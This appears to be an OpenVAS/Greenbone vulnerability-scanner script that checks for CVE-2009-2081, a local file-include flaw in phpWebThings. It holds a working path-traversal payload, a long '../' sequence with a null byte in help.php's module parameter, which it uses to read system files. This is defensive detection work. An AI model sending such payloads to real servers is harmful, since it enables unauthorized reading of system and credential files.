if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100220" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2009-06-14 17:19:03 +0200 (Sun, 14 Jun 2009)" );
	script_cve_id( "CVE-2009-2081" );
	script_bugtraq_id( 35313 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:N/A:N" );
	script_name( "phpWebThings 'module' Parameter Local File Include Vulnerability" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "phpWebThings_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "phpwebthings/detected" );
	script_tag( name: "summary", value: "phpWebThings is prone to a local file-include vulnerability because
  it fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to view files and execute
  local scripts in the context of the webserver process, which may aid in further attacks." );
	script_tag( name: "affected", value: "phpWebThings 1.5.2 is vulnerable, other versions may also be
  affected." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/35313" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!version = get_kb_item( NASLString( "www/", port, "/phpWebThings" ) )){
	exit( 0 );
}
if(!matches = eregmatch( string: version, pattern: "^(.+) under (/.*)$" )){
	exit( 0 );
}
dir = matches[2];
if(!isnull( dir )){
	files = traversal_files();
	for pattern in keys( files ) {
		file = files[pattern];
		url = NASLString( dir, "/help.php?module=../../../../../../../../../../../../", file, "%00" );
		req = http_get( item: url, port: port );
		buf = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(!buf){
			continue;
		}
		if(egrep( pattern: pattern, string: buf )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 0 );

